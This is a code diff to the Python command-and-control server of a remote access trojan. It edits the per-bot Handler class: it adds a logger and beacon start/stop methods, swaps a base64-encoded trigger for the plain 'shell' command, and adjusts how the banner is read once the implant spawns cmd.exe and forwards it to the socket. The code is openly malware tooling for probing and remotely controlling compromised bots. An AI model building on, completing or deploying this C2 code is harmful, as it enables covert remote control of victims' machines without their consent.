@@ -11,8 +11,9 @@ import random
 
 class Handler(threading.Thread):
 
-    def __init__(self, client, client_address, bot_id):
+    def __init__(self, client, client_address, bot_id, logger):
         threading.Thread.__init__(self)
+        self.logger = logger
         self.client = client
         self.client_address = client_address
         self.ip = client_address[0]
@@ -21,6 +22,7 @@ class Handler(threading.Thread):
         self.info = [self.bot_id,self.ip,self.port]
         self.beacon_wait = False
         self.os = ''
+        self.interactive = False
         self.status = ["UP","UP"]                           # <--UP - DOWN - ERR 
                                                             # [0] = PING, [1] = BEACON
 
@@ -69,6 +71,7 @@ class Handler(threading.Thread):
 
             # Write to log file - record uptime
 
+            # if self.interactive:
             # Check RAT-STATUS
             if not self.beacon_wait:
                 try:
@@ -80,7 +83,7 @@ class Handler(threading.Thread):
                         self.status[1] = "DOWN"
                 except:
                     self.status[1] = "ERR"
-                    
+                        
             # Write to beacon log file to record status
 
 
@@ -88,6 +91,12 @@ class Handler(threading.Thread):
     def setStatus(self, index0, index1):
         self.status[0] = index0
         self.status[1] = index1
+
+    def stopBeacon(self):
+        self.beacon_wait = True
+
+    def startBeacon(self):
+        self.beacon_wait = False
 
     def setOS(self):
         self.os = self.execute("UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt", True)
@@ -117,23 +126,26 @@ class Handler(threading.Thread):
         # Initiate shell
 
         try:
-            self.execute("aSB3YW50IHNoZWxsIG5vdw", True)             # Signals RAT to initiate cmd.exe process and forward fds to socket
+            self.execute("shell", True)             # Signals RAT to initiate cmd.exe process and forward fds to socket
         except Exception as ex:
             print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")
             print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
             return False                            # unsuccessful
         else:
+
             banner = ""
             while True:
                 try:
                     self.client.settimeout(2)
                     recv = self.client.recv(4096).decode('utf-8')
-                except:
+                except socket.timeout:
                     recv = ""
+                
                 if not recv:
                     break
                 else:
                     banner += recv
+
             if banner:
                 print(banner)
         
@@ -218,6 +230,7 @@ class Handler(threading.Thread):
                         break
 
         print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
+        self.beacon_wait = False
         return True
 
 
@@ -265,14 +278,3 @@ class Handler(threading.Thread):
 
     def upload(self, localfile, remotepath):
         print("TBC")
-
-    # def log(self, type, msg, ):
-
-    #     if type == ping:
-    #         # write to uptime log
-    #     elif type == beacon:
-    #         # write to beacon log
-    #     elif type == error:
-    #         # write to error log
-    #     elif type == status:
-    #         # 
